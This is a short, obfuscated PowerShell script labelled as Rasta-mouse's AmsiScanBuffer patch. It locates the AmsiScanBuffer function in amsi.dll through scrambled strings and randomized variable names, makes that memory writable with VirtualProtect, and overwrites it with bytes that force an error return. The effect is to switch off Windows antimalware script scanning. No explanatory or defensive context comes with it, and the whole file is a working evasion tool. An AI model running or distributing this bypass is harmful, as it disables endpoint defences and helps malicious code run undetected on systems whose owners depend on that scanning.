#Rasta-mouses Amsi-Scan-Buffer patch \n
$asvub = @"
using System;
using System.Runtime.InteropServices;
public class asvub {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr yqufka, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $asvub

$cjwqmfv = [asvub]::LoadLibrary("$(('ämsí'+'.dll').nORMALizE([CHar]([bYTe]0x46)+[chaR](111*48/48)+[CHar]([BYTe]0x72)+[char](96+13)+[CHAR]([byte]0x44)) -replace [cHar](92*72/72)+[Char](112)+[Char]([byTe]0x7b)+[chAR](77+3-3)+[char]([ByTE]0x6e)+[CHaR](116+9))")
$wxtjdl = [asvub]::GetProcAddress($cjwqmfv, "$(('Àm'+'sí'+'Sc'+'än'+'Bu'+'ff'+'er').noRMALizE([ChaR](40+30)+[ChAr](111*54/54)+[char]([BYTE]0x72)+[cHaR]([byTe]0x6d)+[cHAR](11+57)) -replace [cHAr]([bYTe]0x5c)+[ChAr]([bytE]0x70)+[CHaR](123*117/117)+[cHAr](77*45/45)+[ChAr]([BYTE]0x6e)+[CHAr](125+86-86))")
$p = 0
[asvub]::VirtualProtect($wxtjdl, [uint32]5, 0x40, [ref]$p)
$lmru = "0xB8"
$hhbj = "0x57"
$amka = "0x00"
$yhyk = "0x07"
$bkuw = "0x80"
$oaxp = "0xC3"
$wmhpr = [Byte[]] ($lmru,$hhbj,$amka,$yhyk,+$bkuw,+$oaxp)
[System.Runtime.InteropServices.Marshal]::Copy($wmhpr, 0, $wxtjdl, 6)
